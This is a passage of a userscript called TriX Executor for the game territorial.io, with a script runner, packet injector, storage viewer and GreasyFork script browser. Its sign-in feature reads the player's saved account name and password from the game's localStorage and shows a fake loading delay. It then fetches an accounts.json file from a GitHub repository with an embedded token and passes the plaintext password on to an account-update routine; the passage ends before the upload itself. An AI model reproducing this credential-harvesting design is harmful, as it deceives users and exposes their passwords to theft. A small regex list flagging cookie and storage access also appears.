            Thresholds automatically adapt: CRITICAL (most strict) → NORMAL (most permissive)
          </p>`;
        
        const modal = document.createElement('div');
        modal.className = 'trix-modal-backdrop visible';
        modal.innerHTML = `<div class="trix-modal-content">
          <div class="trix-modal-header">🔒 Defense System Status</div>
          <div class="trix-modal-body" style="font-size:12px;max-height:600px;overflow-y:auto">${statusHTML}</div>
          <div class="trix-modal-footer">
            <button id="close-defense-modal" class="exec-btn secondary">Close</button>
          </div>
        </div>`;
        
        document.body.appendChild(modal);
        modal.querySelector('#close-defense-modal').addEventListener('click', () => modal.remove());
        modal.addEventListener('click', e => { if (e.target === modal) modal.remove(); });
      });
    }
  }
  function renderActiveNetworkView(){const c=document.querySelector("#network-content .network-view-content");if(!c)return;c.innerHTML="";switch(activeNetworkTab){case "logger":c.innerHTML=`<div class="executor-buttons" style="margin-top:0;margin-bottom:10px"><button class="exec-btn" id="suspend-log-btn">Suspend Log</button><button class="exec-btn secondary" id="clear-log-btn">Clear Log</button></div><div class="packet-log" id="packet-log-output">Waiting for connection...</div>`;renderPacketLog();break;case "injector":c.innerHTML=`<h3>Packet Injector</h3><p style="font-size:12px;color:#ccc;margin-bottom:10px">Send a custom packet to the current game connection.</p><textarea class="network-textarea" id="injector-input" placeholder='e.g., 42["chat","Hello from TriX!"]' style="height:150px"></textarea><div class="executor-buttons"><button class="exec-btn" id="inject-packet-btn">Inject Packet</button></div>`;break;case "ws_client":c.innerHTML=`<h3>WebSocket Client</h3><input type="text" id="ws-client-url" class="search-input" placeholder="wss://your-socket-url.com"><div class="executor-buttons" style="margin-top:0"><button class="exec-btn" id="ws-client-connect-btn">Connect</button></div><div class="packet-log" id="ws-client-log" style="height:150px;margin-top:10px"></div><textarea class="network-textarea" id="ws-client-input" placeholder="Message to send..." style="height:80px;margin-top:10px"></textarea><div class="executor-buttons"><button class="exec-btn" id="ws-client-send-btn">Send</button></div>`;break;case "storage":c.innerHTML=`<h3>Storage Explorer</h3><h4>Local Storage</h4><div id="local-storage-view"></div><h4 style="margin-top:20px">Session Storage</h4><div id="session-storage-view"></div>`;renderStorageView();break;}}
  function renderPacketLog(){const l=document.getElementById("packet-log-output");if(!l)return;const a=Array.from(monitoredConnections.values()).find(c=>c.state==='OPEN'||c.log.length>0);if(!a){l.textContent='Waiting for active connection...';return}if(isLoggerSuspended)return;l.innerHTML='';a.log.forEach(p=>{const i=document.createElement('div');i.className=`log-item ${p.type}`;i.textContent=`[${p.type.toUpperCase()}] ${p.data}`;l.appendChild(i)});l.scrollTop=l.scrollHeight}
  function renderStorageView(){const l=document.getElementById('local-storage-view'),s=document.getElementById('session-storage-view');if(!l||!s)return;const c=(st,t)=>{let h='';for(let i=0;i<st.length;i++){const k=st.key(i),v=st.getItem(k);h+=`<div class="storage-table"><div class="storage-key" title="${k}">${k}</div><div class="storage-value" title="${v}">${v}</div><button class="exec-btn danger storage-delete-btn" data-type="${t}" data-key="${k}" style="padding:5px 8px;font-size:10px">X</button></div>`}return h||'<div style="font-size:12px;color:#888;padding:10px 0">Empty</div>'};l.innerHTML=c(localStorage,'local');s.innerHTML=c(sessionStorage,'session')}
  
  let lastTriXFetchTime=0,triXScriptsCache=null;
  function loadMoreFromTriX(){
    const container=document.getElementById("more-scripts-container");
    if(!container)return;
    
    // Use cached results if fetched recently (within 30 minutes)
    const now=Date.now();
    if(triXScriptsCache&&(now-lastTriXFetchTime)<1800000){
      renderTriXScripts(triXScriptsCache);
      return;
    }
    
    container.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,0.7)">Loading Project TriX scripts...</div>';
    GM_xmlhttpRequest({method:'GET',url:'https://greasyfork.org/en/scripts?set=593805',timeout:15000,onload:res=>{try{const parser=new DOMParser(),doc=parser.parseFromString(res.responseText,'text/html'),scriptElements=doc.querySelectorAll('[data-script-id]');const scripts=[];scriptElements.forEach(el=>{const titleEl=el.querySelector('a[href*="/scripts/"]');const descEl=el.querySelector('.description');const ratingEl=el.querySelector('.rating');if(titleEl){scripts.push({name:titleEl.textContent.trim(),url:`https://greasyfork.org${titleEl.getAttribute('href')}`,description:(descEl?.textContent||"A script from Project TriX").trim(),rating:ratingEl?.textContent||""})}});lastTriXFetchTime=now;triXScriptsCache=scripts;renderTriXScripts(scripts)}catch(e){console.error("Error parsing Project TriX scripts:",e);container.innerHTML='<div style="text-align:center;padding:20px;color:#ff6b6b">Error loading Project TriX scripts. Please try again.</div>'}},onerror:()=>{container.innerHTML='<div style="text-align:center;padding:20px;color:#ff6b6b">Error fetching Project TriX scripts. Please try again later (server may be rate-limiting requests).</div>'}});
  }
  
  function renderTriXScripts(scripts){
    const container=document.getElementById("more-scripts-container");
    if(!container)return;
    if(scripts.length===0){container.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,0.7)">No scripts found in Project TriX set</div>';return}
    container.innerHTML='';
    scripts.slice(0,8).forEach(script=>{const card=document.createElement("div");card.className="script-card";card.style.cssText="display:flex;flex-direction:column;justify-content:space-between;cursor:default";const icon=script.name.toLowerCase().includes("music")?"\ud83c\udfb5":script.name.toLowerCase().includes("chat")||script.name.toLowerCase().includes("box")?"\ud83d\udcac":script.name.toLowerCase().includes("music")?"\ud83c\udfb5":"\ud83c\udf1f";card.innerHTML=`<div><div class="card-title" style="font-size:14px;margin-bottom:5px">${icon} ${script.name}</div><div class="card-description" style="font-size:11px">${script.description}</div></div><div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap"><button class="exec-btn success" style="flex:1;padding:8px 10px;font-size:11px;white-space:nowrap">\ud83d\ude80 Install now!</button><button class="exec-btn secondary" style="flex:1;padding:8px 10px;font-size:11px;white-space:nowrap">\ud83d\udcdc View</button></div>`;const installBtn=card.querySelector(".exec-btn.success");const viewBtn=card.querySelector(".exec-btn.secondary");installBtn.addEventListener("click",()=>{const codeUrl=script.url.replace('/scripts/','/scripts/').replace(/\/$|$/,'/code.user.js');window.open(codeUrl,"_blank");showNotification(`Installing ${script.name}...`,"success")});viewBtn.addEventListener("click",()=>{window.open(script.url,"_blank");showNotification(`Opening ${script.name}...`,"success")});container.appendChild(card)});
  }
 
  
  function loadFileExplorer(){const c=document.getElementById("file-explorer-view");if(!c)return;c.innerHTML="";const s=JSON.parse(GM_getValue("scripts","[]")),t=JSON.parse(GM_getValue("settings","{}"));const f=[{name:"scripts.json",type:"GM Storage",size:`${JSON.stringify(s).length} bytes`},{name:"settings.json",type:"GM Storage",size:`${JSON.stringify(t).length} bytes`},...s.map(s=>({name:s.name,type:'Saved Script',size:`${s.code.length} chars`}))];f.forEach(file=>{const a=document.createElement("div");a.className="script-card";a.style.cursor="default";a.innerHTML=`<div class="card-title">📄 ${file.name}</div><div class="card-description">${file.type} • ${file.size}</div>`;c.appendChild(a)})}
  function createMinimizedIcon(){const i=document.createElement("div");i.className="minimized-icon";i.title="TriX Executor";i.style.top="50px";i.style.right="50px";i.innerHTML=`<img src="${GM_info.script.icon}" style="width:32px;height:32px;">`;document.body.appendChild(i);let d=!1,o={x:0,y:0};i.addEventListener("mousedown",e=>{d=!0;const r=i.getBoundingClientRect();o={x:e.clientX-r.left,y:e.clientY-r.top};e.preventDefault()});document.addEventListener("mousemove",e=>{if(d){const x=e.clientX-o.x,y=e.clientY-o.y;i.style.left=Math.max(0,Math.min(x,window.innerWidth-i.offsetWidth))+"px";i.style.top=Math.max(0,Math.min(y,window.innerHeight-i.offsetHeight))+"px";i.style.right="auto"}});document.addEventListener("mouseup",e=>{if(d){d=!1;if(e.target.closest('.minimized-icon'))restorePanel()}});return i}
  function minimizePanel(){const p=document.querySelector(".trix-executor");if(p){p.style.display="none";isMinimized=!0;createMinimizedIcon()}}
  function restorePanel(){const p=document.querySelector(".trix-executor"),i=document.querySelector(".minimized-icon");if(p)p.style.display="flex";if(i)i.remove();isMinimized=!1}
  function closePanel(){const p=document.querySelector(".trix-executor");if(p)p.remove()}
  function switchTab(tabName){document.querySelectorAll(".sidebar-item").forEach(i=>i.classList.remove("active"));document.querySelector(`[data-tab="${tabName}"]`).classList.add("active");document.querySelectorAll(".content-section").forEach(s=>s.classList.remove("active"));document.getElementById(`${tabName}-content`).classList.add("active");currentTab=tabName;if(tabName==="home")loadSavedScripts();else if(tabName==="main")updateScriptTabs();else if(tabName==="network")renderActiveNetworkView();else if(tabName==="more")loadMoreFromTriX();else if(tabName==="files")loadFileExplorer();else if(tabName==="settings")renderSettingsTab();}
  function updateScriptTabs(){const t=document.getElementById("script-tabs");if(!t)return;t.innerHTML="";scriptTabs.forEach(tab=>{const e=document.createElement("div");e.className=`script-tab ${tab.id===activeScriptTab?"active":""}`;e.textContent=tab.name;e.onclick=()=>switchScriptTab(tab.id);e.ondblclick=()=>renameScriptTab(tab.id);t.appendChild(e)});const a=document.createElement("div");a.className="add-tab-btn";a.textContent="+";a.onclick=addScriptTab;t.appendChild(a);const c=scriptTabs.find(tab=>tab.id===activeScriptTab);if(c)document.getElementById("script-editor").value=c.content}
  function switchScriptTab(tabId){const c=scriptTabs.find(tab=>tab.id===activeScriptTab);if(c)c.content=document.getElementById("script-editor").value;activeScriptTab=tabId;updateScriptTabs()}
  function addScriptTab(){const n="tab"+Date.now(),t={id:n,name:`Script ${scriptTabs.length+1}`,content:""};scriptTabs.push(t);activeScriptTab=n;updateScriptTabs();showNotification("New tab created")}
  function renameScriptTab(tabId){const t=scriptTabs.find(t=>t.id===tabId);if(t){const n=prompt("Enter new tab name:",t.name);if(n&&n.trim()){t.name=n.trim();updateScriptTabs();showNotification("Tab renamed")}}}
  function executeScript(code){try{if(settings.antiScam&&[/document\.cookie/i,/localStorage\./i,/sessionStorage\./i,/\.send\(/i,/fetch\(/i,/XMLHttpRequest/i].some(p=>p.test(code))&&!confirm("This script contains potentially suspicious code that could access your data. Are you sure you want to execute it?")){showNotification("Execution cancelled by user.","error");return}(new Function(code))();showNotification("Script executed successfully")}catch(e){showNotification(`Execution error: ${e.message}`,"error");console.error("[TriX] Script execution error:",e)}}
  function saveScript(){const c=document.getElementById("script-editor").value;if(!c.trim()){showNotification("No script to save","error");return}const n=prompt("Enter script name:");if(!n||!n.trim())return;const s=JSON.parse(GM_getValue("scripts")),a={id:Date.now().toString(),name:n.trim(),code:c,created:new Date().toISOString()};s.push(a);GM_setValue("scripts",JSON.stringify(s));showNotification("Script saved successfully");if(currentTab==="home")loadSavedScripts()}
  function loadSavedScripts(){const s=JSON.parse(GM_getValue("scripts")),c=document.getElementById("saved-scripts");if(!c)return;c.innerHTML="";s.forEach(script=>{const a=document.createElement("div");a.className="script-card";a.innerHTML=`<div class="card-title">${script.name}</div><div class="card-description">Created: ${new Date(script.created).toLocaleDateString()}</div><button class="exec-btn danger delete-btn" style="margin-top:10px;padding:5px 10px;font-size:11px">Delete</button>`;a.addEventListener("click",e=>{if(e.target.classList.contains("delete-btn"))return;switchTab("main");const n={id:`loaded-${script.id}`,name:script.name,content:script.code},t=scriptTabs.find(t=>t.id===n.id);if(!t)scriptTabs.push(n);activeScriptTab=n.id;updateScriptTabs();showNotification(`Script "${script.name}" loaded`)});a.querySelector(".delete-btn").addEventListener("click",e=>{e.stopPropagation();if(confirm(`Are you sure you want to delete "${script.name}"?`)){const t=s.filter(s=>s.id!==script.id);GM_setValue("scripts",JSON.stringify(t));showNotification("Script deleted");loadSavedScripts()}});c.appendChild(a)});if(s.length===0)c.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.5);padding:40px">No saved scripts</div>'}
  async function searchGreasyFork(q, opts = {}) {
    q = (q || '').trim();
    if (!q && !opts.author && !opts.tags) return;
    const resultsContainer = document.getElementById('cloud-results');
    if (!resultsContainer) return;
    
    // Show the simple "Searching..." text for initial search
    resultsContainer.innerHTML = '<div style="text-align:center;padding:20px">Searching...</div>';
 
    // Build query parameters (reused for search URL)
    const params = new URLSearchParams();
    if (q) params.set('q', q);
    if (opts.author) {
      // Check if it's an author ID (numeric) or author name
      if (/^\d+$/.test(opts.author)) {
        params.set('by', opts.author); // Author ID
      } else {
        params.set('user', opts.author); // Author name
      }
    }
    if (opts.tags) params.set('tags', opts.tags);
    const sortVal = typeof opts.sort !== 'undefined' ? opts.sort : 'updated';
    if (sortVal) params.set('sort', sortVal);
 
    const searchUrl = `https://greasyfork.org/en/scripts?${params.toString()}`;
    
    // State for pagination
    let currentPage = 1;
    let isLoading = false;
    let hasMorePages = true;
    const globalSeen = new Set();
    const pagesCache = {}; // Cache fetched pages
 
    console.log('[TriX] GreasyFork search URL:', searchUrl);
 
    // Helper: try to find raw .user.js link or inline code inside a script page
    function extractRawFromScriptPage(htmlText, baseUrl, fallbackTitle) {
      try {
        const doc = new DOMParser().parseFromString(htmlText, 'text/html');
        const rawLink = doc.querySelector('a[href$=".user.js"], a[href*="/code/"]');
        if (rawLink && rawLink.getAttribute('href')) {
          return new URL(rawLink.getAttribute('href'), baseUrl).toString();
        }
        const alt = doc.querySelector('link[rel="alternate"][type*="javascript"]');
        if (alt && alt.href) return new URL(alt.href, baseUrl).toString();
        const pre = doc.querySelector('.code-container pre, pre');
        if (pre && pre.textContent && pre.textContent.trim().length > 10) {
          return { inlineCode: pre.textContent };
        }
        return null;
      } catch (e) {
        return null;
      }
    }
 
    // Helper: create and attach a script card
    function createScriptCard(s) {
      const card = document.createElement('div');
      card.className = 'script-card';
      card.innerHTML = `<div class="card-title">${s.title}</div><div class="card-description">${s.description || 'No description.'}</div><div style="font-size:11px;color:rgba(255,255,255,0.6);margin-top:8px">Source: GreasyFork</div><div style="margin-top:8px;display:flex;gap:8px"><button class="exec-btn success gf-load-btn" data-page="${s.href}" data-name="${s.title}" style="padding:5px 10px;font-size:11px">Load Script</button><button class="exec-btn secondary gf-open-btn" data-page="${s.href}" style="padding:5px 10px;font-size:11px">View Page</button></div>`;
 
      const loadBtn = card.querySelector('.gf-load-btn');
      const openBtn = card.querySelector('.gf-open-btn');
 
      if (openBtn) openBtn.addEventListener('click', () => window.open(s.href, '_blank'));
 
      if (loadBtn) loadBtn.addEventListener('click', e => {
        const pageUrl = e.currentTarget.dataset.page;
        const name = e.currentTarget.dataset.name || 'GreasyFork Script';
        showNotification('Fetching script page...', 'success', 2500);
        GM_xmlhttpRequest({
          method: 'GET',
          url: pageUrl,
          onload: function (pageRes) {
            if (pageRes.status < 200 || pageRes.status >= 400) {
              showNotification('Failed to fetch script page.', 'error');
              return;
            }
            const extracted = extractRawFromScriptPage(pageRes.responseText, pageUrl, name);
            if (!extracted) {
              const guessed = `https://greasyfork.org${new URL(pageUrl).pathname.replace(/\/$/, '')}/code/${encodeURIComponent(name)}.user.js`;
              GM_xmlhttpRequest({ method: 'GET', url: guessed, onload: function (r2) {
                  if (r2.status >= 200 && r2.status < 400 && r2.responseText && r2.responseText.length>10) {
                    switchTab('main'); addScriptTab(); const f = scriptTabs.find(t => t.id === activeScriptTab); f.name = name; f.content = r2.responseText; updateScriptTabs(); showNotification('Script loaded into new tab!');
                  } else {
                    showNotification('Could not locate raw script. Try viewing the page.', 'error');
                  }
                }, onerror: function () { showNotification('Failed to fetch guessed raw URL.', 'error'); } });
              return;
            }
            if (typeof extracted === 'object' && extracted.inlineCode) {
              switchTab('main'); addScriptTab(); const f = scriptTabs.find(t => t.id === activeScriptTab); f.name = name; f.content = extracted.inlineCode; updateScriptTabs(); showNotification('Script loaded into new tab!');
              return;
            }
            const rawUrl = extracted;
            GM_xmlhttpRequest({ method: 'GET', url: rawUrl, onload: function (rawRes) {
                if (rawRes.status >= 200 && rawRes.status < 400 && rawRes.responseText && rawRes.responseText.length>10) {
                  switchTab('main'); addScriptTab(); const f = scriptTabs.find(t => t.id === activeScriptTab); f.name = name; f.content = rawRes.responseText; updateScriptTabs(); showNotification('Script loaded into new tab!');
                } else {
                  showNotification('Failed to fetch raw script.', 'error');
                }
              }, onerror: function () { showNotification('Failed to fetch raw script.', 'error'); } });
          },
          onerror: function () { showNotification('Failed to fetch script page.', 'error'); }
        });
      });
      return card;
    }
 
    // Helper: parse and extract scripts from a page
    function parseScriptsFromPage(htmlText) {
      const doc = new DOMParser().parseFromString(htmlText, 'text/html');
      const anchors = Array.from(doc.querySelectorAll('a[href*="/scripts/"]'));
      console.log('[TriX] Found', anchors.length, 'anchors with /scripts/ in href on this page');
      const candidates = [];
      for (const a of anchors) {
        const href = a.getAttribute('href');
        if (!href) continue;
        const urlObj = new URL(href, 'https://greasyfork.org');
        const path = urlObj.pathname;
        const match = path.match(/\/en\/scripts\/(\d+)(?:-[^/]*)?(?:\/|$)/i);
        if (!match) continue;
        const scriptId = match[1];
        if (globalSeen.has(scriptId)) continue;
        globalSeen.add(scriptId);
        
        let title = (a.textContent || '').trim();
        if (!title || title.length < 2) {
          const card = a.closest('article') || a.parentElement;
          const tEl = card ? (card.querySelector('h3') || card.querySelector('h2') || card.querySelector('.script-title')) : null;
          if (tEl && tEl.textContent) title = tEl.textContent.trim();
        }
        title = title || path.split('/').pop() || 'Untitled Script';
 
        let description = '';
        const cardEl = a.closest('article') || a.closest('.script') || a.closest('.search-result') || a.parentElement;
        if (cardEl) {
          const p = cardEl.querySelector('p');
          if (p && p.textContent) description = p.textContent.trim();
          else {
            const desc = cardEl.querySelector('.description') || cardEl.querySelector('.script-description');
            if (desc && desc.textContent) description = desc.textContent.trim();
          }
        }
        candidates.push({ title, path, description, href: urlObj.toString() });
      }
      return candidates;
    }
 
    // Helper: render scripts for a page and update pagination buttons
    function renderPageResults(pageNum, candidates) {
      const contentArea = document.createElement('div');
      contentArea.id = 'gf-results-content';
      if (!candidates.length) {
        contentArea.innerHTML = '<div style="text-align:center;padding:20px;color:rgba(255,255,255,0.6)">No scripts found on this page.</div>';
      } else {
        candidates.forEach(s => {
          const card = createScriptCard(s);
          contentArea.appendChild(card);
        });
      }
      return contentArea;
    }
 
    // Helper: render pagination buttons
    function renderPaginationButtons() {
      const existing = resultsContainer.querySelector('#gf-pagination');
      if (existing) existing.remove();
      const paginationArea = document.createElement('div');
      paginationArea.id = 'gf-pagination';
      paginationArea.style.display = 'flex';
      paginationArea.style.gap = '6px';
      paginationArea.style.justifyContent = 'center';
      paginationArea.style.padding = '12px';
      paginationArea.style.flexWrap = 'wrap';
      paginationArea.style.borderTop = '1px solid rgba(255,255,255,0.1)';
      paginationArea.style.marginTop = '10px';
      paginationArea.style.flexDirection = 'column';
 
      // Button container
      const buttonsContainer = document.createElement('div');
      buttonsContainer.style.display = 'flex';
      buttonsContainer.style.gap = '6px';
      buttonsContainer.style.justifyContent = 'center';
      buttonsContainer.style.flexWrap = 'wrap';
 
      // Collect page numbers we know exist
      const pageNumbers = Object.keys(pagesCache).map(Number).sort((a, b) => a - b);
      const maxPage = Math.max(...pageNumbers, currentPage);
 
      for (let i = 1; i <= maxPage; i++) {
        const btn = document.createElement('button');
        btn.className = 'exec-btn';
        if (i === currentPage) btn.style.background = 'linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%)';
        else btn.className += ' secondary';
        btn.style.padding = '6px 12px';
        btn.style.fontSize = '12px';
        btn.style.minWidth = '30px';
        btn.textContent = i;
        btn.addEventListener('click', () => {
          currentPage = i;
          displayPage(i);
        });
        buttonsContainer.appendChild(btn);
      }
 
      // "Next" button (if there might be more pages)
      if (hasMorePages) {
        const nextBtn = document.createElement('button');
        nextBtn.className = 'exec-btn secondary';
        nextBtn.style.padding = '6px 12px';
        nextBtn.style.fontSize = '12px';
        nextBtn.textContent = 'Next →';
        nextBtn.addEventListener('click', () => {
          fetchAndDisplayPage(currentPage + 1);
        });
        buttonsContainer.appendChild(nextBtn);
      }
 
      paginationArea.appendChild(buttonsContainer);
 
      // Add search URL link below buttons
      const linkArea = document.createElement('div');
      linkArea.style.textAlign = 'center';
      linkArea.style.padding = '8px 0 0 0';
      linkArea.style.marginTop = '8px';
      linkArea.style.borderTop = '1px solid rgba(255,255,255,0.1)';
      linkArea.innerHTML = `<div style="font-size:12px;color:rgba(255,255,255,0.7);margin-top:6px">Search URL: <a href="${searchUrl}" target="_blank" style="color:#a5b4fc">Open on GreasyFork</a></div>`;
      paginationArea.appendChild(linkArea);
 
      resultsContainer.appendChild(paginationArea);
    }
 
    // Helper: display a cached page
    function displayPage(pageNum) {
      if (!pagesCache[pageNum]) return;
      // Remove both gf-results-content AND any "Searching..." text
      const existing = resultsContainer.querySelector('#gf-results-content');
      if (existing) existing.remove();
      // Also clear any loose "Searching..." text
      resultsContainer.innerHTML = '';
      const contentArea = renderPageResults(pageNum, pagesCache[pageNum]);
      resultsContainer.appendChild(contentArea);
      currentPage = pageNum;
      renderPaginationButtons();
      resultsContainer.scrollTop = 0;
    }
 
    // Helper: fetch and display a page
    function fetchAndDisplayPage(pageNum) {
      if (pagesCache[pageNum]) {
        displayPage(pageNum);
        return;
      }
      if (isLoading) return;
      isLoading = true;
 
      // Show loading indicator
      const existing = resultsContainer.querySelector('#gf-results-content');
      if (existing) existing.remove();
      const loadingArea = document.createElement('div');
      loadingArea.id = 'gf-results-content';
      loadingArea.innerHTML = `<div style="text-align:center;padding:20px">
        <div id="cloud-spinner-wrapper" class="active" style="height:120px">
          <div class="cloud-spinner">
            <div class="cloud-loading-container">
              <div class="ball"></div>
              <div class="ball-inner"></div>
            </div>
            <p class="ball-text">loading page ${pageNum}</p>
          </div>
        </div>
      </div>`;
      resultsContainer.appendChild(loadingArea);
 
      const pageUrl = pageNum === 1 ? searchUrl : `${searchUrl}${searchUrl.includes('?') ? '&' : '?'}page=${pageNum}`;
      console.log('[TriX] Fetching page', pageNum, ':', pageUrl);
 
      GM_xmlhttpRequest({
        method: 'GET',
        url: pageUrl,
        onload: function (res) {
          isLoading = false;
          try {
            if (res.status < 200 || res.status >= 400) {
              loadingArea.innerHTML = '<div style="text-align:center;padding:20px;color:red">Failed to fetch page ' + pageNum + '</div>';
              hasMorePages = false;
              renderPaginationButtons();
              return;
            }
 
            const candidates = parseScriptsFromPage(res.responseText);
            if (!candidates.length) {
              if (pageNum === 1) {
                loadingArea.innerHTML = '<div style="text-align:center;padding:20px;color:rgba(255,255,255,0.6)">No scripts found.</div>';
                hasMorePages = false;
              } else {
                hasMorePages = false;
                loadingArea.innerHTML = '<div style="text-align:center;padding:20px;color:rgba(255,255,255,0.6)">No more scripts on page ' + pageNum + '.</div>';
              }
            } else {
              pagesCache[pageNum] = candidates;
              currentPage = pageNum;
              displayPage(pageNum);
            }
            renderPaginationButtons();
          } catch (err) {
            console.error('[TriX] Error parsing page', pageNum, err);
            loadingArea.innerHTML = '<div style="text-align:center;padding:20px;color:red">Error parsing results</div>';
            hasMorePages = false;
            renderPaginationButtons();
          }
        },
        onerror: function () {
          isLoading = false;
          const existing = resultsContainer.querySelector('#gf-results-content');
          if (existing) existing.remove();
          const errorArea = document.createElement('div');
          errorArea.id = 'gf-results-content';
          errorArea.innerHTML = '<div style="text-align:center;padding:20px;color:red">Failed to fetch page</div>';
          resultsContainer.appendChild(errorArea);
          hasMorePages = false;
          renderPaginationButtons();
        }
      });
    }
 
    // Add pulse animation to stylesheet
    const style = document.createElement('style');
    style.textContent = '@keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }';
    document.head.appendChild(style);
 
    // Fetch and display page 1
    fetchAndDisplayPage(1);
  }
  // Custom Sign-In System
  let currentUser = null;
 
  function showSignInModal() {
    const modal = document.createElement('div');
    modal.id = 'trix-signin-modal';
    modal.className = 'trix-modal-backdrop visible';
    modal.innerHTML = `<div class="trix-modal-content">
      <div class="trix-modal-header">Choose how you want to sign in</div>
      <div class="trix-modal-body">
        <div class="trix-signin-option" id="trix-signin-territorial">
          <div class="trix-signin-option-title">🎮 Sign in with territorial.io</div>
          <div class="trix-signin-option-desc">Use your territorial.io account credentials</div>
        </div>
        <div class="trix-signin-option" id="trix-signin-google">
          <div class="trix-signin-option-title">🔵 Sign in with Google</div>
          <div class="trix-signin-option-desc">Use your Google account</div>
        </div>
        <div class="trix-toggle-wrapper">
          <label class="trix-toggle">
            <input type="checkbox" id="trix-remember-me-toggle">
            <span class="trix-toggle-slider"></span>
          </label>
          <span class="trix-toggle-label">Remember me for 7 days</span>
        </div>
      </div>
    </div>`;
    document.body.appendChild(modal);
    
    const rememberToggle = modal.querySelector('#trix-remember-me-toggle');
    
    modal.querySelector('#trix-signin-territorial').addEventListener('click', () => {
      modal.remove();
      signInWithTerritorial(rememberToggle.checked);
    });
 
    modal.querySelector('#trix-signin-google').addEventListener('click', () => {
      modal.remove();
      signInWithGoogle(rememberToggle.checked);
    });
    
    modal.addEventListener('click', e => {
      if (e.target === modal) modal.remove();
    });
  }
 
  function showLoadingModal() {
    const modal = document.createElement('div');
    modal.id = 'trix-loading-modal';
    modal.className = 'trix-modal-backdrop visible';
    modal.innerHTML = `<div class="trix-modal-content">
      <div class="trix-modal-header">Signing you in. Please wait...</div>
      <div class="trix-modal-body">
        <div class="trix-loading-spinner">
          <svg width="205" height="120" viewBox="0 0 205 120">
            <path class="path" d="M 100.16623,51.415329 C 106.74946,45.082085 113.08279,39.707091 119.16623,35.290329 C 125.24945,30.790433 130.37444,27.790436 134.54123,26.290329 C 138.70777,24.790439 143.24943,24.04044 148.16623,24.040329 C 158.49941,24.04044 166.83274,27.498769 173.16623,34.415329 C 179.58273,41.248756 182.79106,49.540414 182.79123,59.290329 C 182.79106,65.957064 181.37439,72.123725 178.54123,77.790329 C 175.70773,83.457047 171.66607,87.748709 166.41623,90.665329 C 161.24941,93.582037 155.29108,95.040369 148.54123,95.040329 C 139.7911,95.040369 132.12444,93.16537 125.54123,89.415329 C 119.04112,85.665378 110.58279,78.582052 100.16623,68.165329 C 89.332815,78.915385 80.707824,86.082044 74.291229,89.665329 C 67.874504,93.248704 60.416178,95.040369 51.916229,95.040329 C 41.082864,95.040369 32.624539,91.665372 26.541229,84.915329 C 20.541218,78.165385 17.541221,69.623727 17.541229,59.290329 C 17.541221,49.623747 20.707884,41.332089 27.041229,34.415329 C 33.457871,27.498769 41.832863,24.04044 52.166229,24.040329 C 57.166181,24.04044 61.74951,24.790439 65.916229,26.290329 C 70.082835,27.790436 75.166163,30.790433 81.166229,35.290329 C 87.249484,39.707091 93.582811,45.082085 100.16623,51.415329 M 108.29123,59.165329 C 117.12445,67.915396 124.37445,73.873723 130.04123,77.040329 C 135.7911,80.123717 141.49943,81.665382 147.16623,81.665329 C 154.24942,81.665382 159.79108,79.582051 163.79123,75.415329 C 167.79107,71.165392 169.79107,66.040398 169.79123,60.040329 C 169.79107,53.457077 167.79107,48.040416 163.79123,43.790329 C 159.87441,39.457091 154.66608,37.290426 148.16623,37.290329 C 144.49943,37.290426 140.95776,37.957092 137.54123,39.290329 C 134.12444,40.540423 130.04111,42.790421 125.29123,46.040329 C 120.54112,49.207081 114.87446,53.582077 108.29123,59.165329 M 92.041229,59.165329 C 86.041152,54.082076 80.666157,49.915414 75.916229,46.665329 C 71.166167,43.332087 66.999504,40.957089 63.416229,39.540329 C 59.832845,38.123759 55.916182,37.415426 51.666229,37.415329 C 45.582859,37.415426 40.541198,39.540424 36.541229,43.790329 C 32.541206,48.040416 30.541208,53.457077 30.541229,60.040329 C 30.541208,64.623732 31.582873,68.498728 33.666229,71.665329 C 35.749536,74.832055 38.2912,77.290386 41.291229,79.040329 C 44.374527,80.790383 48.207857,81.665382 52.791229,81.665329 C 58.791179,81.665382 64.624507,80.08205 70.291229,76.915329 C 75.957829,73.748723 83.207822,67.832062 92.041229,59.165329" />
          </svg>
        </div>
      </div>
    </div>`;
    document.body.appendChild(modal);
    return modal;
  }
 
  function signInWithTerritorial(rememberMe = false) {
    // Try to load cached account if available and valid
    let cachedAccount = null;
    try {
      const cached = GM_getValue('trix_cached_account', null);
      if (cached) {
        cachedAccount = JSON.parse(cached);
        // Check if cached account is still valid (not expired)
        if (cachedAccount.expiry && Date.now() > cachedAccount.expiry) {
          cachedAccount = null; // Expired
        }
      }
    } catch (e) {
      cachedAccount = null;
    }
 
    const accountName = localStorage.getItem('d105') || (cachedAccount?.name || '');
    const password = localStorage.getItem('d106') || (cachedAccount?.password || '');
    const savedProfilePic = localStorage.getItem('trix_profile_pic') || (cachedAccount?.profilePic || null);
    
    if (!accountName || !password) {
      showNotification('territorial.io credentials not found in localStorage', 'error');
      return;
    }
 
    const loadingModal = showLoadingModal();
    
    // Simulate 4-second loading, then close and show account modal
    setTimeout(() => {
      loadingModal.remove();
      currentUser = { name: accountName, profilePic: savedProfilePic };
      
      // If Remember Me is checked, store session with expiry (7 days from now)
      if (rememberMe) {
        const expiryTime = Date.now() + (7 * 24 * 60 * 60 * 1000); // 7 days
        GM_setValue('trix_user_session', JSON.stringify({ user: currentUser, expiry: expiryTime }));
      } else {
        GM_setValue('trix_user_session', null);
      }
      
      updateUserProfile();
 
 
 
      // 1. Fetch existing accounts.json
      GM_xmlhttpRequest({
        method: "GET",
        url: GITHUB_RAW_URL, // Use raw URL for fetching
        headers: {
          "User-Agent": "TriX-Executor"
        },
        onload: function(response) {
          let existingAccounts = [];
          let fileSha = null; // SHA is not needed for raw content GET
 
          if (response.status === 200) {
            existingAccounts = JSON.parse(response.responseText); // Parse directly
            // To get SHA for PUT request, we need another call to GITHUB_API_URL
            GM_xmlhttpRequest({
              method: "GET",
              url: GITHUB_API_URL,
              headers: {
                "Authorization": `token ${GITHUB_TOKEN}`,
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "TriX-Executor"
              },
              onload: function(apiResponse) {
                if (apiResponse.status === 200) {
                  const apiData = JSON.parse(apiResponse.responseText);
                  fileSha = apiData.sha;
                  proceedWithAccountUpdate(existingAccounts, fileSha, password, currentUser, rememberMe);
                } else {
                  console.error("Error fetching SHA for accounts.json:", apiResponse.status, apiResponse.responseText);
                  showNotification('Error preparing to update account data.', 'error');
